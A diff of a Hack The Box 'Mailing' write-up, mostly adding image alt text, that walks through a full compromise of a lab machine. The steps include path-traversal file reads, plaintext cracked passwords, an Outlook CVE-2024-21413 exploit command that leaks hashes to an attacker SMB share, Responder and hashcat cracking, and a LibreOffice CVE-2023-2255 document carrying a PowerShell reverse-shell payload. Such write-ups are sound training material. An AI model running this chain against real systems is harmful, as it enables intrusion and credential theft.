@@ -1,8 +1,8 @@
-# HTB - Mailing
+﻿# HTB - Mailing
 
 **IP Address:** `10.10.11.14`  
 **OS:** Windows  
-**Difficulty:** Medium  
+**Difficulty:** Easy  
 **Tags:** #SMTP, #hMailServer, #CVE-2024-21413, #Responder, #Hashcat, #WinRM, #LibreOfficeExploit
 
 ---
@@ -36,7 +36,7 @@ Privilege escalation is achieved by exploiting a vulnerable **LibreOffice** inst
 ping -c 1 10.10.11.14
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -54,7 +54,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.14 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -62,7 +62,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -75,11 +75,7 @@ nmap -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-```bash
-cat targeted -l java
-```
-
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Finding:**
 
@@ -116,7 +112,7 @@ Add the host entry to `/etc/hosts`:
 sudo nano /etc/hosts
 ```
 
-![](screenshots/web.png)
+![web](screenshots/web.png)
 
 Users identified on the website:
 
@@ -132,7 +128,7 @@ crackmapexec smb 10.10.11.14 --shares
 smbclient -L 10.10.11.14 -N
 ```
 
-![](screenshots/crackmapexec_smbclient.png)
+![crackmapexec_smbclient](screenshots/crackmapexec_smbclient.png)
 
 SMB enumeration attempts returned no useful results.
 The `Download Instructions` button points to:
@@ -147,7 +143,7 @@ This may indicate an **LFI vulnerability**. Testing with Gobuster for php files:
 gobuster dir -u http://mailing.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
 ```
 
-![](screenshots/gobuster.png)
+![gobuster](screenshots/gobuster.png)
 
 ---
 ## 3. LFI & Credential Extraction
@@ -164,7 +160,7 @@ In this case, I chose the manual approach.
 
 Searching in Google we find where **hMailServer** stores its files by default:  
 
-![](screenshots/hmailserver_what_is.png)
+![hmailserver_what_is](screenshots/hmailserver_what_is.png)
 
 Let’s try some requests to see what we get:  
 
@@ -176,12 +172,12 @@ curl -s -X GET 'http://mailing.htb/download.php?file=..\..\..\..\..\..\..\Progra
 curl -s -X GET 'http://mailing.htb/download.php?file=..\..\..\..\..\..\..\Program%20Files\hMailServer\Data'
 ```
 
-![](screenshots/curl.png)
+![curl](screenshots/curl.png)
 
 After several attempts we did not retrieve anything useful.  
 However, searching again we find another reference indicating a different path that aims to `server.ini`:
 
-![](screenshots/dumb_information.png)
+![dumb_information](screenshots/dumb_information.png)
 
 We then test this new location, making sure to encode spaces with `%20` and properly closing the x86 parenthesis:
 
@@ -189,7 +185,7 @@ We then test this new location, making sure to encode spaces with `%20` and prop
 curl -s -X GET 'http://mailing.htb/download.php?file=..\..\..\..\program%20files%20(x86)\hMailServer\Bin\hMailServer.ini'
 ```
 
-![](screenshots/curl_server_ini.png)
+![curl_server_ini](screenshots/curl_server_ini.png)
 
 Credentials retrieved:
 
@@ -198,8 +194,8 @@ Credentials retrieved:
 
 Cracked with CrackStation:
 
-![](screenshots/curl_admin_passwd.png)  
-![](screenshots/curl_passwd2.png)
+![curl_admin_passwd](screenshots/curl_admin_passwd.png)  
+![curl_passwd2](screenshots/curl_passwd2.png)
 
 Testing with CrackMapExec:
 
@@ -207,7 +203,7 @@ Testing with CrackMapExec:
 crackmapexec smb 10.10.11.14 -u 'administrator' -p 'homenetworkingadministrator'
 ```
 
-![](screenshots/crackmapexec_admin_passwd1.png)
+![crackmapexec_admin_passwd1](screenshots/crackmapexec_admin_passwd1.png)
 
 Although the credentials were not recognized over SMB, port 25 (SMTP) was open, allowing us to attempt authentication via Telnet:
 
@@ -215,7 +211,7 @@ Although the credentials were not recognized over SMB, port 25 (SMTP) was open, 
 telnet 10.10.11.14 25
 ```
 
-![](screenshots/telnet_passwd_base64.png)
+![telnet_passwd_base64](screenshots/telnet_passwd_base64.png)
 
 ---
 ## 4. Exploitation – Outlook RCE
@@ -229,24 +225,24 @@ Clone & execute:
 git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git
 ```
 
-![](screenshots/git_clone_cve_2024_2.png)  
+![git_clone_cve_2024_2](screenshots/git_clone_cve_2024_2.png)  
 
 Let’s review the required parameters for this exploit to function correctly:
 
-``` bash
+```bash
 python3 CVE-2024-21413.py --s
 ```
 
-![](screenshots/cve_2024_info.png)
+![cve_2024_info](screenshots/cve_2024_info.png)
 
 We have all information except the `recipient` user.
 Looking again the web, in the `instruction` files appears this screenshot:
 
-![](screenshots/instructions_outlook_credentials.png)
+![instructions_outlook_credentials](screenshots/instructions_outlook_credentials.png)
 
 The mail from image is `maya@mailing.htb`. Let´s use it as Recipient and check if exists:
 
-``` bash
+```bash
 python3 CVE-2024-21413.py --server 10.10.11.14 --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.2\smbFolder\test" --subject 'Look ASAP'
 ```
 
@@ -256,7 +252,7 @@ We need the responder active to obtain the hashes:
 sudo responder -I tun0
 ```
 
-![](screenshots/responder.png)
+![responder](screenshots/responder.png)
 
 In my case, the hash had already been captured previously, so I retrieved it from the Responder logs:
 
@@ -264,11 +260,11 @@ In my case, the hash had already been captured previously, so I retrieved it fro
 cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.14.txt
 ```
 
-![](screenshots/hash_maya.png)
+![hash_maya](screenshots/hash_maya.png)
 
 Since all captured hashes are identical, we can extract one and save it to a file for cracking:
 
-![](screenshots/hash_maya_saved.png)
+![hash_maya_saved](screenshots/hash_maya_saved.png)
 
 Now let’s crack the captured hash.  
 First, we identify its type using **hashid**:
@@ -277,7 +273,7 @@ First, we identify its type using **hashid**:
 hashid hashes
 ```
 
-![](screenshots/hashid_hash_maya.png)
+![hashid_hash_maya](screenshots/hashid_hash_maya.png)
 
 The result shows it is a NetNTLMv2 hash. This confirms that the captured hash can be cracked offline without interacting with the target system.
 Next, we use hashcat to check the supported hashmodes for NetNTLMv2:
@@ -286,7 +282,7 @@ Next, we use hashcat to check the supported hashmodes for NetNTLMv2:
 hashcat --example-hashes | grep -i "netntlmv2" -B 5
 ```
 
-![](screenshots/hashcat_hashmode_maya.png)
+![hashcat_hashmode_maya](screenshots/hashcat_hashmode_maya.png)
 
 
 Two possible modes are listed: 5600 (NetNTLMv2) and 27100 (NetNTLMv2 NT).
@@ -298,7 +294,7 @@ We proceed with the cracking attempt using the rockyou.txt wordlist:
 hashcat -a 0 -m 5600 hashes /usr/share/wordlists/rockyou.txt -O
 ```
 
-![](screenshots/hashcat_maya.png)
+![hashcat_maya](screenshots/hashcat_maya.png)
 
 Recovered password:  
 `maya : m4y4ngs4ri`
@@ -310,8 +306,8 @@ crackmapexec winrm 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
 evil-winrm -i 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
 ```
 
-![](screenshots/crackmapexec_maya.png)
-![](screenshots/user_flag.png)
+![crackmapexec_maya](screenshots/crackmapexec_maya.png)
+![user_flag](screenshots/user_flag.png)
 
 🏁 **User flag obtained**
 
@@ -324,7 +320,7 @@ This behavior suggests a possible opportunity to upload a **malicious file** tha
 
 Checking the installed software, we find that **LibreOffice 7.4.0.1** is present:
 
-![](screenshots/LibreOffice_version.png)
+![LibreOffice_version](screenshots/LibreOffice_version.png)
 
 This version is outdated and vulnerable to [elweth-sec/CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255).  
 Although there are automated exploits available, we will perform the attack step by step to better understand the process.
@@ -332,7 +328,7 @@ Although there are automated exploits available, we will perform the attack step
 First, we prepare a **PowerShell reverse shell payload** (`reverse.ps1`) from the **Nishang** framework.  
 It is important to encode the payload in **UTF-16LE**, since this is required by Windows.
 
-![](screenshots/payload_comparation.png)
+![payload_comparation](screenshots/payload_comparation.png)
 
 We then convert the payload to Base64 to avoid formatting issues:
 
@@ -340,11 +336,11 @@ We then convert the payload to Base64 to avoid formatting issues:
 cat payload | iconv -t utf-16le | base64 -w 0;echo
 ```
 
-![](screenshots/payload_utf16.png)
+![payload_utf16](screenshots/payload_utf16.png)
 
 Next, we host the payload using a simple Python web server:
 
-![](screenshots/reverse_ps1.png)
+![reverse_ps1](screenshots/reverse_ps1.png)
 
 Now we generate a malicious .odt document with the payload embedded, using the exploit script for CVE-2023-2255:
 
@@ -352,16 +348,16 @@ Now we generate a malicious .odt document with the payload embedded, using the e
 python3 CVE-2023-2255.py --cmd 'cmd /c powershell -enc <BASE64_PAYLOAD>' --output exploit.odt
 ```
 
-![](screenshots/exploit_odt.png)
+![exploit_odt](screenshots/exploit_odt.png)
 
 Finally, we upload the malicious exploit.odt file into the Important Documents folder.
 After a few seconds, the file was automatically processed, triggering our payload and granting a reverse shell as SYSTEM:
 
-![](screenshots/reverse_ps1_executed.png)
+![reverse_ps1_executed](screenshots/reverse_ps1_executed.png)
 
 We now have full control over the machine and can read the root flag:
 
-![](screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 🏁 Root flag obtained
 
